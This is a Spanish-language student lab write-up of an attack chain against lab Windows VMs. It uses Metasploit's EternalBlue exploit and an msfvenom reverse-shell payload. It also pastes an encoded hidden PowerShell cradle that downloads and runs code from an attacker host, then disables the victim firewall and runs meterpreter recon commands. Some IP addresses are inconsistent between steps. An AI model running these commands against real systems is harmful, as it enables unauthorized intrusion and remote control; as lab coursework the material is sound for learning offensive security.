---
title: "Lab 04 - Kill Chain 3"
date: 2026-06-26 08:49:00
categories: [lab, setup]
tags: [metasploitable, virtualbox, kali, kill Chain, EternalBlue]
---

# 1 RECONOCIMIENTO Y EXPLORACION DEL MODULO ANTES DE EXPLOTAR

## 1.1 Comenzamos viendo la herramienta que tenemos

Ingresamos el siguiente comando para poder ver la informacion del eternalblue

```
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
info
```

Obtendremos el siguiente resultado:

![RECONOCIMIENDO ETERNALBLUE](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782656646/RECONOCIMIENTO_DEL_ETERNALBLUE_lomc4n.png)

Del cual podemos ver los atributos como:

- Nombre : exploit/windows/smb/ms17_010_eternalblue
- Plataforma : Windows
- Privilegio : Si (otorga control total)
- Fecha de divulgación : 2017-03-14

Muestra tambien los objetivos disponibles:

- Windows 7
- Windows Embedded Standard 7
- Windows Server 2008 R2
- Windows 8
- Windows 8.1
- Windows Server 2012
- Windows 10 PRO
- Windows 10 Enterprise Evaluation

Adicionalmente de una descripción de esta vulnerabilidad y lo que puede causar en la victima, aparte de proporcionarnos referencias y enlaces a repositorios de GitHub.

## 1.2 Ubicamos donde esta el archivo dentro de mi Kali

Usando el comando:

```
locate ms17_010_eternalblue.rb
```

Podremos ver la direccion donde esta el archivo.

![UBICACION](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782658007/UBICACION_DEL_ETERNALBLUE_uykky6.png)

## 1.3 Visualización de manufactura del payload con los parametros que configuramos

Para poder hacer este paso y poder visualizar ingresamos la siguiente linea:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.9 LPORT=4444 -f hex 2>/dev/null | head -c 160
```

Este comando genera un programa (payload) que, al ejecutarse en la maquina victima, abrirá una conexión inversa hacia la IP 10.0.2.9 por el puerto 4444. Luego, ese programa es convertido a formato hexadecimal, se filtran las primeras 160 líneas (para limpiar basura de la cabecera) y el resultado final (el código máquina crudo) se muesta en la pantalla.

![PAYLOAD](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782660345/MANERA_DE_MANUFACTURA_EL_PAYLOAD_ql3owb.png)

# 2 CONFIRMAR LA VULNERABILIDAD

para confirmar la vulnerabilidad ejecutamos el siguiente comando:

```
sudo nmap --script vuln -p 445 10.0.2.3
```

Obteniendo como resutlado:
![RESULTADO FALLIDO](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782662459/VULNERABILIDAD_FALLIDA_mgip9p.png)

Analizando el resultado obtenido, podemos concluir que el firewall de mi maquina virtual esta activado, por lo cual si realizamos un ataque no tendremos resultado, asi que tenemos 2 opciones:

- OPCION 1: Desactivar el firewall del windows manualmente y volver a ejecutar el comando.
- OPCION 2: Desactivarlo desde el kali, usando el usuario y contraseña obtenidos las clases pasadas.

asi que realizaremos la OPCION 2

### Opción 2

#### Paso 1

Desde la `msfconsole`, ejecutamos el siguiente comando:

```
use exploit/multi/script/web_delivery
set LHOST 10.0.2.10
set LPORT 4444
set SRVHOST 10.0.2.10
set SRVPORT 8080
set TARGET 2
set payload windows/x64/meterpreter/reverse_tcp
run
```

![ENTRADA PARA APAGAR FIREWALL](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782677324/ENTRANDO_PARA_APAGAR_EL_FIREWALL_vzjm37.png)

#### Paso 2

Abrimos una nueva pestaña de terminal en el kali y escribimos esto para conectarnos por ssh a la victima.

```
ssh vagrant@10.0.2.3
```
Nos va a pedir la clase de la maquina victima, la cual sabemos que es "vagrant".

Una vez dentro copiamos la linea de codigo largo que aparecio en la ventara anterior.

`powershell.exe -nop -w hidden -c ... (una línea larguísima de código)`

En mi caso pondremos:

```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc "WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABpAHcAOQA1AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGkAdwA5ADUALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABpAHcAOQA1AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIALgAxADAAOgA4ADAAOAAwAC8AVwBUAHEAZAA3ADYANwBXAC8AbgAzAFkAdQB0AEcATgAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIALgAxADAAOgA4ADAAOAAwAC8AVwBUAHEAZAA3ADYANwBXACcAKQApADsA"
```

Una vez ingresado podremos ver que en la primera terminal nos aparecera esto:

![CON ACCESO](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782677952/CON_ACCESO_PARA_APAGAR_EL_FIREWALL_oresej.png)

#### Paso 3

Escribimos el siguiente comando

```
sessions -i 1
```

Esto nos dara acceso al meterpreter, y una vez dentro del meterpreter, escribimos:

```
shell
```

y una vez ya dentro del cmd ejecutamos el siguiente comando:

```
netsh advfirewall set allprofiles state off
```

Aplicando esto obtendremos el siguiente resultado:

![FIREWALL OFF](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782678533/SIN_FIREWALL_ffi6f3.png)

Y asi desactivamos el firewall para la victima.

Volvemos a confirmar que el firewall esta desactivado:

![CONFIRMACION DE FIREWALL DESACTIVADO](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782678729/CONFIRMACION_DE_FIREWALL_OFF_li61ml.png)

# 3 EXPLOTAR CON METASPLOIT

Para hacer explotar con metasploit ejecutamos el siguiente comando:

```
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.15
set LHOST 10.0.2.9
set payload windows/x64/meterpreter/reverse_tcp
run
```

con este comando nos saldra lo siguiente:

![RESULTADO DE METASPLOIT](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782679358/EXPLOTAR_METASPLOIT_fyhqjo.png)

# 4 RESULTADO

Con este resultadoo tenemos control total de la máquina victima.

Podemos hacer lo siguiente en la etapa de reconocimiento:
## 4.1 Reconocimiento
### 4.1.1 Ver información del sistema:

Ingresamos el siguiente comando:

```
sysinfo
```

![SYSINFO](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782679712/SYSINFO_gxxjqh.png)

### 4.1.2 Saber quien eres:

Ingresamos el siguiente comando:

```
getuid
```

![GETUID](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782679938/GETUID_tzat96.png)

### 4.1.3 Ver procesos que estan ejecutandose:

Ingresamos el siguiente comando:

```
ps
```

![PS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782680088/PS_fhnbpb.png)

### 4.1.4 Ver información de la red (IP, adaptadores, etc:

Ingresamos el siguiente comando:

```
ipconfig
```

![IPCONFIG](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782680296/IPCONFIG_updzdr.png)













